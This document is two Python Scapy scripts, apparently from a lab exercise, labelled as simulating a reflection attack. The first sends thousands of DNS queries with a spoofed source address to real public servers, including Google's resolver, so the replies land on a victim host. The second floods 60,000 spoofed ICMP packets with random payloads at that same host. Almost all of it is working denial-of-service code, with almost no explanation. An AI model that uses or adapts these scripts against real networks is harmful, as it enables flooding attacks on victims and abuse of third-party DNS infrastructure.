# Reflection attack
# reflection.py

''' This file is to simute a reflection attack '''
#Supress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

# First Server
dns_req = IP(dst='8.8.8.8', src='192.168.1.2')/UDP(dport=53, sport = 80)/DNS(rd=1, qd=DNSQR(qname='www.google.com'))
print(dns_req.show())
sendp(dns_req, count = 5000, inter = 1./100)


# Second Server
dns_req2 = IP(dst='98.137.11.163', src='192.168.1.2')/UDP(dport=53, sport = 80)/DNS(rd=1, qd=DNSQR(qname='www.yahoo.com'))
print(dns_req2.show())
sendp(dns_req2, count = 6000, inter = 1./100)


# Third Server
dns_req2 = IP(dst='142.250.68.46', src='192.168.1.2')/UDP(dport=53, sport = 80)/DNS(rd=1, qd=DNSQR(qname='www.youtube.com'))
print(dns_req2.show())
sendp(dns_req2, count = 7000, inter = 1./100)

# sendSpoof.py
#Supress Scapy IPv6 warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

def main():
	frame = Ether()/IP()/ICMP()/Raw(RandString(size=800))

# This line shows the packets as being malformed in wireshark
#	frame = Ether()/IP()/UDP(dport=53)/Raw(RandString(size=800))
#	frame[UDP].sport = 50000

#	frame = Ether()/IP()

	frame[Ether].dst = "40:4c:ca:40:4b:34"
	frame[Ether].src = "aa:bb:cc:dd:ee:ff"

	frame[IP].src = "192.168.1.4"
	frame[IP].dst = "192.168.1.2"
	frame[IP].version = 4
	val = 60000
	print(frame.show())
	print("Sending " + str(val) + " packets")
#1./100 means 100 packets per second; 10ms rate
#1./50 means 50 packets per second; 20ms rate 
#1./20 means 20 packets per second; 50 ms rate
#1./10 means 10 packets per second; 100ms rate
#1./100 means 100 packets per second
	sendp(frame, count = val , inter = 1./100)

if __name__ == "__main__":
	main() 